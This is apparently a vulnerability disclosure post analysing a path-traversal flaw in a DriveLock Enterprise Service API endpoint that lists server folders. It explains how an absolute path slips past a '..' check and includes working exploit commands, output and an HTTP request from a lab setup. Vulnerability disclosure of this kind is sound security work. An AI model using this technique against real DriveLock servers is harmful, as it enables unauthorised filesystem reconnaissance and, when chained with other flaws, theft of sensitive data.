---
layout: post_collection_entry
date:   2026-03-01
categories: [patch analysis]
advisory_collection: drivelock_multi_2026_patch_analysis

title:  "[PatchAnalysis - DriveLock] DriveLock Enterprise Service - List folder content"
advisory:
  product: DriveLock
  homepage: https://www.drivelock.com/
  vulnerable_version: "< 25.2.4, < 25.1.7, < 24.2.9"
  fixed_version: "25.2.4, 25.1.7, 24.2.9"
  found: 2026-02-27
  cve: "ToDo"
  impact_text: MEDIUM
  impact_score: 4.9
  cvss: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
---

# Product description
> The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
> This means you are secure at the centre, with all paths of access to your sensitive data blocked.

*Cite: [DriveLock - Homepage](https://www.drivelock.com/en/)*

This platform includes the `DriveLock Core` component, which is an agent installed on the client machines.


# Overview
There is a endpoint, which is used to list the content of a local folder on the filesystem of the `DES`. This is used to show all available log files in the `https://192.168.60.10:4568/ui/app/settings/serverSettings` -> `LogFiles` UI. As the provided path is not fully validated it is possible to break out of the predefined folder and list the content of any folder on the system.

**Privileges Required**
* User required: `true`
* Permission: `PermissionType.Infrastructure_Manage`

## Impact
This vulnerability alone does only leak information about the local system. But it can be used in combination with any of the `local file inclusion` vulnerabilities to search the system for sensitive data and access them afterward.


# Root Cause Analysis
The endpoint `/api/administration/infrastructure/diagnosticFileListing` accepts three path parameters. One of them is the `subFolder` parameter, which is used to build the full path of the folder to list the content.

```c#
// FILE - DriveLock.EnterpriseServer.ServiceBroker/DriveLock.EnterpriseServer.ServiceBroker/DiagnosticFileHandling.cs

FUNCTION FileListing(OUT content, folderId, subFolder):

    // 1. Resolve known folder
    knownFolder = GetKnownFolder(folderId)

    IF knownFolder IS NULL OR EMPTY THEN
        content = NULL
        RETURN Result(false, "Unknown folder")
    END IF

    // 2. Normalize subfolder
    IF subFolder IS NULL THEN
        subFolder = EMPTY_STRING
    END IF

    // 3. Prevent path traversal
    IF subFolder CONTAINS ".." THEN
        content = NULL
        RETURN Result(false, "Not allowed subfolder")
    END IF

    TRY
        // 4. Prepare result container
        content = NEW DirectoryContent()
        // 5. Build target path
        targetPath = CombinePath(knownFolder, subFolder)
        // 6. Ensure directory exists
        IF DirectoryExists(targetPath) IS FALSE THEN
            RETURN Result(false, "Directory '" + targetPath + "' does not exist")
        END IF

        // 7. Read directory entries
        entries = GetFileSystemEntries(targetPath)

        FOR EACH entry IN entries DO
        // ....
```

As shown above the `subFolder` parameter is validated and a check is performed that it does not include `..`  to move up to a parent directory. Thus the value `./../../../../windows` would be rejected. But it does not test if the provided path is a full qualified path like `C:\windows`.

This lack of validation can be exploit, because the function `Path.Combine` is used to construct the full path - `string text = Path.Combine(knownFolder, subFolder);`.

As the documentation states:

> **Important**
> This method assumes that the first argument is an absolute path and that the following argument or arguments are relative paths. If this is not the case, and particularly if any subsequent arguments are strings input by the user, call the Join or TryJoin method instead.

**CITE: https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine?view=net-10.0**

if any of the parts is absolute, this is used as the new base.

For example:
```c#
Path.Combine("C:\\temp\\foobar", "message.txt"); // --> C:\temp\foobar\message.txt
Path.Combine("C:\\temp\\foobar", "C:\\windows\\message.txt"); // --> C:\\windows\\message.txt
```

# Proof of Concept / Exploit
Setup `JWT` environment var and run the included [PoC - file-listing](/assets/drivelock/poc/poc-file-listing.sh):
```sh
❯ export JWT="XXX"
❯ ./poc-file-listing.sh
```

## Exploit
The following demonstrates the usage of the exploit suite:

```bash
❯ uv run -m drivelock.exploit --tenant doetess -u stuxxn -P '!23456Qwertz' dirList 'packer-win2019.pentest.lab' 'C:\\temp'
[INFO] URL: https://192.168.60.10:4568/api/administration/auth/login
[INFO] Login as - tenant: doetess, user: stuxxn
[INFO] Setup JWT for http.client
[DEBUG] Token: XXX
[INFO] URL: https://192.168.60.10:4568/api/administration/infrastructure/diagnosticFileListing/packer-win2019.pentest.lab/1/C%3A%5Ctemp
[
    FileEntry(name='ConfigurationFile.ini', fsize=481, ftype=<EntryType.FILE: 1>),
    FileEntry(name='SQLServer2019-x64-ENU-Dev.iso', fsize=1426724864, ftype=<EntryType.FILE: 1>),
    FileEntry(name='SSMS-Setup-ENU.exe', fsize=495847104, ftype=<EntryType.FILE: 1>)
]
```

To get the `DES` name, required for the exploit, use the `https://192.168.60.10:4568/api/administration/infrastructure/listDes` endpoint.

```http
POST /api/administration/infrastructure/listDes HTTP/2
Host: 192.168.60.10:4568
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer XXX
Lang: en
Origin: https://192.168.60.10:4568
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```
```json
{
    "servers": [
        {
            "desName": "packer-win2019.pentest.lab",
            "desType": 1,
            "httpAddress": "https://packer-win2019.pentest.lab:6067",
            "tenant": "root"
        }
    ]
}
```
